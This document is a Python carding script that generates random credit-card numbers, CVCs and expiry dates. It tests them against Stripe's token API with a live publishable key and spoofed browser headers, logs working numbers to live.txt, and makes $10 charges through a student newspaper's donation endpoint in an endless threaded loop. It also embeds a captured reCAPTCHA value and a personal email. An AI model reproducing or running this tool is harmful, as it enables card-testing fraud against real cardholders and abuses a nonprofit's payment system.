import os
import random
import requests
import json
from dotenv import load_dotenv
from concurrent.futures import ThreadPoolExecutor
from requests.exceptions import ProxyError, ConnectionError
from urllib3.exceptions import InsecureRequestWarning
import random
from requests.auth import HTTPProxyAuth
from threading import Lock

# Define locks for each file
dead_file_lock = Lock()
live_file_lock = Lock()
result_file_lock = Lock()

# Disable the InsecureRequestWarning
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
# Load environment variables from .env file
load_dotenv()


def generate_random_card():
    # Choose a random credit card issuer (e.g., Visa, Mastercard)
    issuer = random.choice(["4", "5", "6"])

    # Generate the remaining digits based on the issuer
    if issuer == "4":  # Visa
        card_number = "4" + ''.join(random.choices('0123456789', k=15))
    elif issuer == "5":  # Mastercard
        card_number = "5" + ''.join(random.choices('0123456789', k=15))
    else:  # Discover or other issuers
        card_number = "6" + ''.join(random.choices('0123456789', k=15))

    # Calculate the check digit using the Luhn algorithm
    # check_digit = luhn_check(card_number)

    # Generate random expiration month and year
    exp_month = str(random.randint(1, 12)).zfill(2)
    exp_year = str(random.randint(2023, 2030))  # Assuming cards are valid for the next few years

    # Generate a random CVC (Card Verification Code)
    cvc = ''.join(random.choices('0123456789', k=3))
    print(card_number + "|" + exp_month + "|" + exp_year + "|" + cvc)
    return card_number, exp_month, exp_year, cvc

# Function to perform Luhn algorithm check
def luhn_check(card_number):
    """
    Validate a credit card number using the Luhn algorithm.
    """
    digits = [int(digit) for digit in card_number]
    for i in range(len(digits) - 2, -1, -2):
        digits[i] *= 2
        if digits[i] > 9:
            digits[i] -= 9
    return str((10 - sum(digits) % 10) % 10)  # Calculate the check digit

# Token generation request
def get_stripe_token(card_number, exp_month, exp_year, cvc):
    headers = {
        'accept': 'application/json',
        'accept-language': 'en-US,en;q=0.9',
        'content-type': 'application/x-www-form-urlencoded',
        'origin': 'https://js.stripe.com',
        'referer': 'https://js.stripe.com/',
        'sec-ch-ua-mobile': '?0',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-site',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.77 Safari/537.36'
    }
    payload = {
        'card[number]': card_number,
        'card[cvc]': cvc,
        'card[exp_month]': exp_month,
        'card[exp_year]': exp_year,
        'guid': 'a2ef37b2-51da-4888-91d1-e6eec8887ecb070158',
        'muid': '671a702d-2400-425d-b4ea-d130688079b02ffd8f',
        'sid': 'f5b4bc2e-1b6e-4bb5-9ff2-0e9d94bde5756195ab',
        'payment_user_agent': 'stripe.js/b5d6cae0f; stripe-js-v3/b5d6cae0f',
        'time_on_page': '40582',
        'referrer': 'https://badgerherald.com/',
        'key': 'pk_live_ZqsOEoLHjZPnC0fB1FsjWzRv',
        'pasted_fields': 'number'
    }
    url = 'https://api.stripe.com/v1/tokens'

    token = ""
    response = requests.post(url, headers=headers, data=payload, verify=False)
    # print(response.json().error)
    data = response.json()
    msg = ""
    if data.get("error"):
        msg = data.get("error").get("message")
        token = ""
    else:
        token = response.json()['id']
    return token, msg

# Donation request
def make_donation(token):
    headers = {
        'authority': 'badgerherald.com',
        'accept': '*/*',
        'accept-language': 'en-US,en;q=0.9',
        'cache-control': 'max-age=0',
        'content-type': 'application/json',
        'origin': 'https://badgerherald.com',
        'referer': 'https://badgerherald.com/donate/',
        'sec-ch-ua-mobile': '?0',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-origin',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.77 Safari/537.36',
        'x-wp-nonce': os.getenv('WP_NONCE'),  # Read from environment
    }

    data = {
        'amount': 10,
        'first': 'Adi',
        'last': 'Singh',
        'reoccurance': 0,
        'token': token,
        'nonce': os.getenv('NONCE'),  # Read from environment
        'email': 'adirajput1701x@gmail.com',
        'comment': '',
        'recaptcha': 'HFbnFzfQhXPxcyRU5GQFtXQQQgOjsQRi4hHSQmJjYIM3wUMiZvG1xmHRVkSCtTLTcVOA5qCgIAR0RXf2Q5DFs4OXU0Ok11Umw3VGZieVR8OldAZUogUHZrXixRRlcXHXZWUX50dUU9MiYUPlQsKQpaEhd4cgJ5YSx3W2RZPlg4dF90QU1kF2MXHRM3PVo'
    }

    try:
        response = requests.post('https://support.badgerherald.org/wp-json/donate/v1/process-donation', headers=headers, data=json.dumps(data), verify=False)
        return response.text
    except requests.exceptions.RequestException as e:
        return "Request exception"  # Return None to indicate failure

# Process a single card



def process_card():
    card_details = generate_random_card()
    card_number, exp_month, exp_year, cvc = card_details
   
    try:
        token, msg = get_stripe_token(card_number, exp_month, exp_year, cvc)
        if token == "":
            # Write data to dead.txt
            with dead_file_lock:
                with open("dead.txt", "a") as dead_file:
                    dead_file.write(f"{card_number}|{exp_month}|{exp_year}|{cvc}\n")
            return
        result = f"{card_number}|{exp_month}|{exp_year}|{cvc}"
    
        # Write data to live.txt
        with live_file_lock:
            with open("live.txt", "a") as live_file:
                live_file.write(f"{result}\n")
                
        response = make_donation(token)
        print(f"{card_number}: {response}")
        
        with result_file_lock:
            with open("result.txt", "a") as result_file:
                result_file.write(f"{result}|Message: {response}\n")
                
    except Exception as e:
        print(f"Error processing card {card_number}: {e}")

def main():
    # proxies = ""
    # Use ThreadPoolExecutor to process cards concurrently
    with ThreadPoolExecutor(max_workers=2) as executor:
        # Generate and process 10 random cards concurrently
        while True:
            # Generate a random card within the ThreadPoolExecutor
            # Submit the processing of the card to the executor
            executor.submit(process_card)

if __name__ == "__main__":
    main()
